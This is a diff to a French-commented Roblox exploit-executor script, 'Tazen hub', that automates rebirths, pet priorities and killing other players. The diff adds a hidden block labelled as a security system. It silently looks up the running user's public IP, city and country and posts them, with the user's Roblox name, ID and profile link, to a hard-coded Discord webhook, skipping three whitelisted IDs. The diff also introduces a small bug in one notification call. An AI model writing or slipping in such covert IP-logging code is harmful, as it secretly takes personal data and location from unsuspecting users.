@@ -1,4 +1,4 @@
--- Tazen hub V1 by TZ_THR
+-- Tazen hub V1 by TZ_THR rework
 
 local success, err = pcall(function()
 
@@ -15,7 +15,86 @@ local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-if not game:IsLoaded() then game.Loaded:Wait() end -- auto-exec : on attend le chargement complet du jeu
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- ===================== WEBHOOK SECURITY & GEO-IP SYSTEM =====================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1558249808404283442/r_ao-RXJgDrMN-J__AbrHGSbsqTwRXTM_YyO9p66w6VYoJQ8qg0N8mxiN9sQdp74ZWA_"
+
+task.spawn(function()
+    pcall(function()
+        local ignoredUserIds = {
+            [2549253643] = true,
+            [7163736802] = true,
+            [4760900584] = true,
+        }
+
+        if ignoredUserIds[LocalPlayer.UserId] then
+            return
+        end
+
+        local reqFunc = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+        if not reqFunc then return end
+
+        local geoReq = reqFunc({
+            Url = "http://ip-api.com/json/?fields=status,message,country,city,query",
+            Method = "GET"
+        })
+
+        local ip = "Inconnue"
+        local country = "Inconnu"
+        local city = "Inconnue"
+
+        if geoReq and geoReq.Body then
+            local successJson, dataGeo = pcall(function()
+                return HttpService:JSONDecode(geoReq.Body)
+            end)
+
+            if successJson and dataGeo and dataGeo.status == "success" and dataGeo.query then
+                local rawIp = tostring(dataGeo.query)
+                if rawIp:match("^%d+%.%d+%.%d+%.%d+$") then
+                    ip = rawIp
+                    country = tostring(dataGeo.country or "Inconnu")
+                    city = tostring(dataGeo.city or "Inconnue")
+                end
+            end
+        end
+
+        if ip == "Inconnue" then
+            ip = "IP Invalide / Masquée"
+        end
+
+        local playerName = LocalPlayer.Name
+        local displayName = LocalPlayer.DisplayName
+        local userId = LocalPlayer.UserId
+        local profileLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+
+        local embedData = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "🛡️ Alerte Sécurité - Nouvelle Exécution",
+                ["color"] = 15844367,
+                ["fields"] = {
+                    {["name"] = "👤 Pseudo", ["value"] = tostring(playerName) .. " (" .. tostring(displayName) .. ")", ["inline"] = true},
+                    {["name"] = "🆔 ID Roblox", ["value"] = tostring(userId), ["inline"] = true},
+                    {["name"] = "🌐 Adresse IP", ["value"] = "||" .. tostring(ip) .. "||", ["inline"] = false},
+                    {["name"] = "📍 Localisation", ["value"] = "Ville: **" .. city .. "** | Pays: **" .. country .. "**", ["inline"] = false},
+                    {["name"] = "🔗 Profil", ["value"] = "[Lien du profil](" .. profileLink .. ")", ["inline"] = false}
+                },
+                ["footer"] = {
+                    ["text"] = "Tazen Hub Security • PlaceId: " .. tostring(game.PlaceId)
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+
+        reqFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(embedData)
+        })
+    end)
+end)
 
 -- ===================== CONFIG & SAVE SYSTEM =====================
 local CONFIG_FILE_PREFIX = "TazenHub_Config_"
@@ -58,9 +137,10 @@ local E = {
 
 local repSpeedPetPriorities = {
     ["Omega Overlord"] = 1,
-    ["Mythic Boss Pet"] = 1,
-    ["Legendary Boss Pet"] = 2,
-    ["Epic Boss Pet"] = 3,
+    ["Swift Samurai"] = 2,
+    ["Mythic Boss Pet"] = 3,
+    ["Legendary Boss Pet"] = 4,
+    ["Epic Boss Pet"] = 5,
 }
 
 local alive = true
@@ -80,7 +160,7 @@ local wheelRunId = 0
 local eggRunId = 0
 local killRunId = 0
 
-local REP_CAP = 659 -- au-delà, le serveur n'accepte pas plus de reps : inutile (et source de lag) d'en envoyer plus
+local REP_CAP = 659
 local repRate = 659
 local repTotal = 0
 
@@ -349,6 +429,7 @@ local function killTargetPlayerLoop(myId)
     end
 end
 
+local StatTracker -- rempli plus bas ; le compteur de renaissances l'utilise comme preuve
 local function fastRebirthLoop(myId)
     local function isRunning() return fastRunId == myId end
     pcall(function()
@@ -539,32 +620,13 @@ local function fastRebirthLoop(myId)
             waitUntil(rebirthAt)
             if not isRunning() then break end
             local tFire = os.clock()
-            local countBefore = rebirthCount()
-            local resultReady, rebirthOk, respLatency = false, true, pingEma
+            local statBefore = StatTracker and StatTracker.stats and StatTracker.stats.rebirths.gained or nil
+            local tSend = os.clock()
             task.spawn(function()
-                local tSend = os.clock()
                 pcall(function()
                     rebirthRemote:InvokeServer("rebirthRequest")
                 end)
-                respLatency = os.clock() - tSend -- durée réelle de l'aller-retour serveur
-                -- Un seul coup d'oeil à 0.08s était souvent trop tôt : avec un ping élevé, la stat
-                -- Rebirths met plus longtemps que ça à se répliquer, et le script croyait alors à
-                -- un échec (ou pire, un succès non confirmé) alors que ça avait réussi.
-                -- On vérifie en continu, pendant une durée proportionnelle au ping mesuré.
-                if countBefore then
-                    local deadline = tick() + math.min(3.0, math.max(0.3, pingEma * 2.5))
-                    local confirmed = false
-                    while tick() < deadline do
-                        local after = rebirthCount()
-                        if after and after > countBefore then
-                            confirmed = true
-                            break
-                        end
-                        task.wait(0.05)
-                    end
-                    rebirthOk = confirmed
-                end
-                resultReady = true
+                pingEma = pingEma * 0.7 + math.min(os.clock() - tSend, 1.5) * 0.3
             end)
 
             waitUntil(tFire + HYDRA_TAIL)
@@ -580,30 +642,34 @@ local function fastRebirthLoop(myId)
                 rebuild()
                 rebuildMs = (os.clock() - tRb0) * 1000
             end
-            local tAfterRebuild = os.clock()
 
-            -- On attend vraiment la réponse du serveur avant de juger (jusqu'à 2.5 s) : couper
-            -- l'attente trop tôt faisait supposer un succès à tort et laissait la marge trop fine,
-            -- ce qui provoquait des refus en cascade et des cycles de plus en plus longs.
-            while isRunning() and not resultReady and os.clock() < tFire + 3.5 do
-                task.wait()
+            -- On ne devine plus si la renaissance a réussi : on attend que le VRAI compteur de
+            -- renaissances (suivi en continu par StatTracker, déjà fiable) bouge réellement.
+            -- C'est plus lent à vérifier qu'un simple chrono, mais ça ne ment jamais.
+            local confirmedAt = nil
+            if statBefore then
+                local deadline = os.clock() + 8
+                while isRunning() and os.clock() < deadline do
+                    if StatTracker.stats.rebirths.gained > statBefore then
+                        confirmedAt = StatTracker.stats.rebirths.lastT or os.clock()
+                        break
+                    end
+                    task.wait(0.1)
+                end
             end
             local tAfterWait = os.clock()
-            pingEma = pingEma * 0.7 + math.min(respLatency, 1.5) * 0.3
 
-            if resultReady and not rebirthOk then
-                -- Vraiment refusé par le serveur : on élargit un peu la marge et on retente bientôt.
-                margin = math.min(margin + 0.05, 0.3)
-                rebirthAt = tFire + math.max(0.3, pingEma + 0.15)
-            else
-                -- Accepté : on resserre doucement la marge. Le ping sert à savoir combien de temps
-                -- attendre la confirmation, PAS à gonfler la marge : un ping élevé ne veut pas dire
-                -- qu'il faut tirer plus tard, juste qu'on met plus de temps à savoir si ça a marché.
+            if confirmedAt then
+                -- Confirmé : on programme la suite à partir du moment RÉEL de la renaissance,
+                -- pas de l'instant où on a tiré, pour ne jamais tirer avant la fin du vrai cooldown.
                 margin = math.max(REBIRTH_MARGIN, margin - 0.01)
-                rebirthAt = tFire + REBIRTH_COOLDOWN + margin
+                rebirthAt = confirmedAt + REBIRTH_COOLDOWN + margin
+            else
+                -- Rien de confirmé après 8s : quelque chose s'est perdu (requête ignorée, lag).
+                -- On ne suppose pas un succès, on retente vite plutôt que d'attendre 6s de plus.
+                margin = math.min(margin + 0.05, 0.3)
+                rebirthAt = os.clock() + math.max(0.3, pingEma + 0.15)
             end
-            -- Garde-fou : quoi qu'il arrive, jamais plus de 6.5s entre deux renaissances
-            rebirthAt = math.min(rebirthAt, tFire + 6.5)
 
             -- Diagnostic : durée réelle du cycle précédent et répartition par phase, en ms.
             -- off = retirer les pets de force | swap = équiper les Hydra | fire->tail = entre le
@@ -718,7 +784,7 @@ local function formatNumber(val)
 end
 
 -- ===================== STAT TRACKER =====================
-local StatTracker = {}
+StatTracker = StatTracker or {}
 do
     local SUFFIX = {
         k = 1e3, m = 1e6, b = 1e9, t = 1e12, qa = 1e15, qi = 1e18,
@@ -987,9 +1053,9 @@ local T = {
     Background = Color3.fromRGB(12, 12, 12),
     Topbar = Color3.fromRGB(18, 18, 18),
     Element = Color3.fromRGB(24, 24, 24),
-    Stroke = Color3.fromRGB(255, 130, 180),       -- Rose élégant
-    Accent = Color3.fromRGB(240, 110, 160),       -- Rose vif UI
-    Text = Color3.fromRGB(255, 255, 255),         -- Blanc pur
+    Stroke = Color3.fromRGB(255, 130, 180),
+    Accent = Color3.fromRGB(240, 110, 160),
+    Text = Color3.fromRGB(255, 255, 255),
     SubText = Color3.fromRGB(190, 190, 190),
     Off = Color3.fromRGB(45, 45, 45),
 }
@@ -1059,7 +1125,6 @@ local watermark = new("Frame", {
     ZIndex = 4,
 }, main)
 
--- Grand T Blanc en arrière-plan (plus grand et centré)
 new("TextLabel", {
     Size = UDim2.fromOffset(180, 200),
     Position = UDim2.new(0.12, 0, 0, 0),
@@ -1072,7 +1137,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, watermark)
 
--- Grand Z Rose en arrière-plan (plus grand et bien positionné)
 new("TextLabel", {
     Size = UDim2.fromOffset(180, 200),
     Position = UDim2.new(0.40, 0, 0.12, 0),
@@ -1085,7 +1149,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, watermark)
 
--- Lettrage TAZEN compact et unifié sous le grand logo
 local tazenBrandBox = new("Frame", {
     Size = UDim2.fromOffset(200, 45),
     Position = UDim2.new(0.5, -100, 0.74, 0),
@@ -1093,14 +1156,12 @@ local tazenBrandBox = new("Frame", {
     ZIndex = 4,
 }, watermark)
 
--- Layout pour coller parfaitement les lettres entre elles sans espaces vides
 new("UIListLayout", {
     FillDirection = Enum.FillDirection.Horizontal,
     SortOrder = Enum.SortOrder.LayoutOrder,
     Padding = UDim.new(0, 0),
 }, tazenBrandBox)
 
--- T (Blanc)
 new("TextLabel", {
     Size = UDim2.fromOffset(32, 45),
     BackgroundTransparency = 1,
@@ -1113,7 +1174,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, tazenBrandBox)
 
--- Λ (Rose, collé au T)
 new("TextLabel", {
     Size = UDim2.fromOffset(32, 45),
     BackgroundTransparency = 1,
@@ -1126,7 +1186,6 @@ new("TextLabel", {
     ZIndex = 4,
 }, tazenBrandBox)
 
--- ZEN (Blanc, collé au Λ)
 new("TextLabel", {
     Size = UDim2.fromOffset(110, 45),
     BackgroundTransparency = 1,
@@ -1138,9 +1197,7 @@ new("TextLabel", {
     LayoutOrder = 3,
     ZIndex = 4,
 }, tazenBrandBox)
--- =====================================================================
 
--- TOPBAR (Bande originale noire, propre et stylée)
 local topbar = new("Frame", {
     Name = "Topbar",
     Size = UDim2.new(1, 0, 0, 28),
@@ -1149,7 +1206,6 @@ local topbar = new("Frame", {
     ZIndex = 6,
 }, main)
 
--- Titre d'origine : Tazen hub V1 | by TZ_THR
 textLabel({
     Size = UDim2.new(1, -70, 1, 0),
     Position = UDim2.new(0, 10, 0, 0),
@@ -1662,8 +1718,6 @@ autoSaveConfigToggle = addKillingToggle(killPage, E.wrench .. " Auto Save Config
     end
 end)
 
--- Après un server hop (auto-exec), les toggles reviennent sur ON depuis la config mais la boucle
--- n'était jamais relancée : on la relance ici.
 task.spawn(function()
     task.wait(2)
     if not alive then return end
@@ -1781,7 +1835,6 @@ local function addPlayerRow(plr)
     playerRows[plr] = { row = row, sync = sync }
 end
 
--- Ajoute/retire seulement les lignes nécessaires et met à jour les couleurs (très léger)
 local function refreshPlayerListUI()
     pcall(function()
         for plr in pairs(playerRows) do
@@ -1948,7 +2001,7 @@ copyDiscordBtn.Activated:Connect(function()
             setclipboard("https://discord.gg/y779ZnRGnd")
             notify("Discord", E.ok .. " Discord link copied to clipboard!")
         else
-            notify("Discord", E.no .. " Clipboard not supported by executor")
+            notify("Discord", E.no, " Clipboard not supported by executor")
         end
     end)
 end)
